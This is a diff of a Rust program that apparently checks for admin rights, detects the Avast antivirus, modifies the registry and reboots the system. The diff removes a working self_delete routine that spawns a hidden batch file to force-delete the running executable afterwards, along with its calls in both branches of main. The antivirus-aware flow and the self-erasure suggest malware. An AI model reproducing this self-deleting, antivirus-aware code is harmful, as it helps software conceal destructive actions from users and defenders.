@@ -310,39 +310,6 @@ fn check_avast_installed() -> bool {
     avast_service_running
 }
 
-fn self_delete() -> io::Result<()> {
-    // Get the path of the current executable
-    if let Ok(exe_path) = env::current_exe() {
-        let exe_str = exe_path.to_string_lossy();
-        let batch_file_path = exe_path.with_extension("bat");
-
-        // Create a batch script that deletes the executable after the program finishes
-        let batch_script = format!(
-            r#"
-            @echo off
-            timeout /t 1 /nobreak > NUL
-            del /f /q "{}"
-            "#,
-            exe_str
-        );
-
-        // Write the batch script to a .bat file
-        fs::write(batch_file_path.clone(), batch_script)?;
-
-        // Run the batch script
-        Command::new(batch_file_path)
-            .stderr(Stdio::null())
-            .stdout(Stdio::null())
-            .spawn()?;
-
-        // Return Ok as the batch script is now running and will delete the executable
-        return Ok(());
-    }
-
-    // Return an error if the executable path can't be found
-    Err(io::Error::new(io::ErrorKind::NotFound, "Executable path not found"))
-}
-
 fn main() {
     // Step 1: Admin Control Check
     if !is_admin() {
@@ -416,11 +383,6 @@ fn main() {
         if let Err(e) = reboot_system() {
             eprintln!("Error rebooting system: {}", e);
         }
-
-        if let Err(e) = self_delete() {
-            eprintln!("Error self delete: {}", e);
-        }
-
     } else {
         println!("Avast not detected. Proceeding with normal operations...");
 
@@ -457,10 +419,5 @@ fn main() {
         if let Err(e) = modify_registry() {
             eprintln!("Error modifying the registry: {}", e);
         }
-
-        if let Err(e) = self_delete() {
-            eprintln!("Error self delete: {}", e);
-        }
-
     }
 }
